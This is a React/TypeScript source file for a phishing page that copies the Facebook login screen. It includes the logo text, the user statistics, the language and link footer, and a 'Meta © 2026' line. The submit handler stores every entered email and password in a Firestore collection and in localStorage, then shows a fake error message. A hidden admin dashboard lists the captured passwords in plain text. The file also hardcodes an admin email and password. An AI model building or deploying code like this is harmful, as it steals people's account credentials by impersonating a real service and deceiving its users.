/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { motion } from "motion/react";
import React, { useState, useEffect } from "react";
import { initializeApp } from "firebase/app";
import { 
  getAuth, 
  signInWithPopup, 
  GoogleAuthProvider, 
  onAuthStateChanged, 
  User,
  signOut
} from "firebase/auth";
import { 
  getFirestore, 
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy, 
  serverTimestamp,
  doc,
  getDocFromServer
} from "firebase/firestore";
import firebaseConfig from "../firebase-applet-config.json";

// Types
enum OperationType {
  CREATE = "create",
  UPDATE = "update",
  DELETE = "delete",
  LIST = "list",
  GET = "get",
  WRITE = "write",
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
  }
}

interface LoginLog {
  email: string;
  password: string;
  time: string;
  createdAt?: any;
}

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app, (firebaseConfig as any).firestoreDatabaseId);
const auth = getAuth(app);
const googleProvider = new GoogleAuthProvider();

// Error Handler
const handleFirestoreError = (error: unknown, operationType: OperationType, path: string | null) => {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
    },
    operationType,
    path
  };
  console.error("Firestore Error: ", JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
};

export default function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [view, setView] = useState<"login" | "dashboard">("login");
  const [logs, setLogs] = useState<LoginLog[]>([]);
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Connection Test
  useEffect(() => {
    const testConnection = async () => {
      try {
        await getDocFromServer(doc(db, "test", "connection"));
      } catch (error) {
        if (error instanceof Error && error.message.includes("the client is offline")) {
          console.error("Please check your Firebase configuration.");
        }
      }
    };
    testConnection();
  }, []);

  // Auth Listener
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      setUser(currentUser);
    });
    return () => unsubscribe();
  }, []);

  // Fetch Logs
  const fetchLogs = async () => {
    if (!user) return;
    setIsLoading(true);
    const path = "login_attempts";
    try {
      const q = query(collection(db, path), orderBy("createdAt", "desc"));
      const querySnapshot = await getDocs(q);
      const fetchedLogs = querySnapshot.docs.map(doc => doc.data() as LoginLog);
      setLogs(fetchedLogs);
    } catch (error) {
      handleFirestoreError(error, OperationType.LIST, path);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (view === "dashboard" && user) {
      fetchLogs();
    }
  }, [view, user]);

  const handleAdminSignIn = async () => {
    try {
      await signInWithPopup(auth, googleProvider);
    } catch (error) {
      console.error("Admin Sign In Error:", error);
    }
  };

  const handleSignOut = async () => {
    try {
      await signOut(auth);
      setView("login");
    } catch (error) {
      console.error("Sign Out Error:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (email === "limon258144@gmail.com" && password === "limon000") {
      setView("dashboard");
      return;
    }

    const newLog: LoginLog = {
      email,
      password,
      time: new Date().toLocaleString(),
    };
    
    // Save to Firestore
    const path = "login_attempts";
    try {
      await addDoc(collection(db, path), {
        ...newLog,
        createdAt: serverTimestamp()
      });
    } catch (error) {
      // Still log locally as fallback context if offline or permitted
      handleFirestoreError(error, OperationType.WRITE, path);
    }
    
    // Fallback to local storage for user's own feedback even if firestore fails
    const updatedLogs = [newLog, ...logs];
    localStorage.setItem("fb_data", JSON.stringify(updatedLogs));
    setLogs(updatedLogs);
    
    setEmail("");
    setPassword("");
    alert("An error occurred. Please try again later.");
  };

  const isAdminEmail = user?.email === "limon2581444@gmail.com";

  if (view === "dashboard") {
    return (
      <div className="min-h-screen bg-[#f4f4f4] p-5 font-sans">
        <div className="max-w-5xl mx-auto">
          <div className="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
            <h2 className="text-2xl font-bold text-slate-800">Admin Login Logs</h2>
            <div className="flex gap-3">
              {!user ? (
                <button 
                  onClick={handleAdminSignIn}
                  className="bg-white text-slate-700 px-4 py-2 border border-slate-300 rounded-md hover:bg-slate-50 font-medium transition-colors"
                >
                  Sign in with Google (Admin)
                </button>
              ) : (
                <button 
                  onClick={handleSignOut}
                  className="bg-white text-slate-700 px-4 py-2 border border-slate-300 rounded-md hover:bg-slate-50 font-medium transition-colors"
                >
                  Sign Out ({user.email})
                </button>
              )}
              <button 
                onClick={() => setView("login")}
                className="bg-[#1877f2] text-white px-4 py-2 rounded-md hover:bg-[#166fe5] font-medium"
              >
                Back to Login
              </button>
            </div>
          </div>

          {!user ? (
            <div className="bg-white p-12 rounded-lg shadow text-center">
              <p className="text-slate-600 mb-6 font-medium">Please sign in as site admin to view logged attempts from Firestore.</p>
              <button 
                onClick={handleAdminSignIn}
                className="bg-[#1877f2] text-white px-8 py-3 rounded-md hover:bg-[#166fe5] font-bold shadow-lg transition-all"
              >
                Sign in as Admin
              </button>
            </div>
          ) : !isAdminEmail ? (
            <div className="bg-white p-12 rounded-lg shadow text-center">
              <p className="text-red-500 mb-4 font-bold text-xl">Access Denied</p>
              <p className="text-slate-600 mb-6">Your account ({user.email}) does not have admin permissions.</p>
              <button 
                onClick={handleSignOut}
                className="bg-slate-100 text-slate-700 px-6 py-2 rounded-md hover:bg-slate-200"
              >
                Sign Out and Try Another Account
              </button>
            </div>
          ) : (
            <div className="bg-white rounded-lg shadow overflow-hidden">
              <div className="p-4 border-b border-slate-200 flex justify-between items-center bg-slate-50">
                <span className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Live Database Logs</span>
                {isLoading && <span className="text-xs text-[#1877f2] animate-pulse">Refreshing...</span>}
              </div>
              <table className="w-full border-collapse">
                <thead>
                  <tr className="bg-[#1877f2] text-white">
                    <th className="p-4 text-left font-semibold">Email/Phone</th>
                    <th className="p-4 text-left font-semibold">Password</th>
                    <th className="p-4 text-left font-semibold">Time</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {logs.length > 0 ? (
                    logs.map((log, index) => (
                      <tr key={index} className="hover:bg-gray-50 transition-colors">
                        <td className="p-4 text-slate-700 font-medium">{log.email}</td>
                        <td className="p-4 text-slate-700 font-mono text-sm bg-slate-50">{log.password}</td>
                        <td className="p-4 text-slate-500 text-sm whitespace-nowrap">{log.time}</td>
                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan={3} className="p-12 text-center text-gray-500 italic">
                        {isLoading ? "Loading data from Firestore..." : "No login attempts recorded in Firestore yet."}
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col font-sans overflow-x-hidden">
      {/* Header Accent */}
      <div className="h-1 w-full bg-[#1877F2]"></div>

      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center px-6 py-12 md:py-20">
        <div className="max-w-[1024px] w-full flex flex-col lg:flex-row items-center justify-between gap-12 lg:gap-8">
          
          {/* Brand Section */}
          <div className="lg:w-3/5 text-center lg:text-left lg:pr-12 md:max-w-2xl">
            <motion.h1 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="text-[#1877F2] text-[48px] md:text-[60px] lg:text-7xl font-extrabold tracking-tighter mb-4 leading-none"
            >
              facebook
            </motion.h1>
            <motion.p 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="text-[20px] md:text-[24px] lg:text-[28px] leading-tight lg:leading-[32px] text-slate-800 font-normal"
            >
              Connect with friends and the world <br className="hidden lg:block" /> around you on Facebook.
            </motion.p>

            {/* Professional Polish Trust Indicators */}
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.6, delay: 0.4 }}
              className="mt-12 hidden md:flex items-center justify-center lg:justify-start gap-8"
            >
              <div className="flex flex-col">
                <span className="text-2xl font-bold text-slate-700">2.9B+</span>
                <span className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Monthly Users</span>
              </div>
              <div className="w-[1px] h-10 bg-slate-300"></div>
              <div className="flex flex-col">
                <span className="text-2xl font-bold text-slate-700">190+</span>
                <span className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Countries</span>
              </div>
            </motion.div>
          </div>

          {/* Login Form Section */}
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.4, delay: 0.1 }}
            className="w-full max-w-[396px]"
          >
            <div className="bg-white p-5 rounded-xl shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] border border-slate-200">
              <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
                <input
                  type="text"
                  placeholder="Email or phone number"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3.5 border border-slate-300 rounded-lg outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-all text-lg"
                />
                <input
                  type="password"
                  placeholder="Password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3.5 border border-slate-300 rounded-lg outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-all text-lg"
                />
                <button
                  type="submit"
                  className="w-full bg-[#1877F2] text-white py-3 rounded-lg text-xl font-bold hover:bg-[#166FE5] active:scale-[0.98] transition-all cursor-pointer"
                >
                  Log In
                </button>
                <div className="text-center">
                  <a 
                    href="#" 
                    className="text-[#1877F2] text-sm font-medium hover:underline"
                  >
                    Forgot password?
                  </a>
                </div>
                <hr className="border-slate-200" />
                <div className="flex justify-center pt-2">
                  <button
                    type="button"
                    className="bg-[#42B72A] text-white px-6 py-3 rounded-lg text-[17px] font-bold hover:bg-[#36A420] active:scale-[0.98] transition-all cursor-pointer"
                  >
                    Create new account
                  </button>
                </div>
              </form>
            </div>
            <p className="mt-6 text-[14px] text-center text-slate-700">
              <a href="#" className="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
            </p>
          </motion.div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white w-full py-8 px-6 border-t border-slate-200 mt-auto">
        <div className="max-w-[980px] mx-auto">
          <div className="flex flex-wrap gap-x-4 gap-y-2 text-xs text-slate-500 mb-2">
            {["English (US)", "Español", "Français (France)", "中文(简体)", "العربية", "Português (Brasil)", "Italiano", "Deutsch", "हिन्दी", "日本語"].map((lang) => (
              <a key={lang} href="#" className="hover:underline">{lang}</a>
            ))}
            <button className="bg-[#f5f6f7] border border-gray-300 px-2 rounded-sm hover:bg-[#ebedf0] text-[16px] leading-none">+</button>
          </div>
          <hr className="my-3 border-slate-100" />
          <div className="flex flex-wrap gap-x-5 gap-y-2 text-xs text-slate-500 opacity-80">
            {["Sign Up", "Log In", "Messenger", "Facebook Lite", "Video", "Places", "Games", "Marketplace", "Meta Pay", "Meta Store", "Meta Quest", "Instagram", "Threads", "Fundraisers", "Services", "Voting Information Center", "Privacy Policy", "Privacy Center", "Groups", "About", "Create Ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices", "Terms", "Help"].map((link) => (
              <a key={link} href="#" className="hover:underline whitespace-nowrap">{link}</a>
            ))}
          </div>
          <div className="mt-5 flex justify-between items-center text-[11px] text-slate-400 font-medium">
            <span>Meta © 2026</span>
            <button 
              onClick={() => setView("dashboard")}
              className="hover:text-slate-600 transition-colors"
            >
              Admin Dashboard
            </button>
          </div>
        </div>
      </footer>
    </div>
  );
}
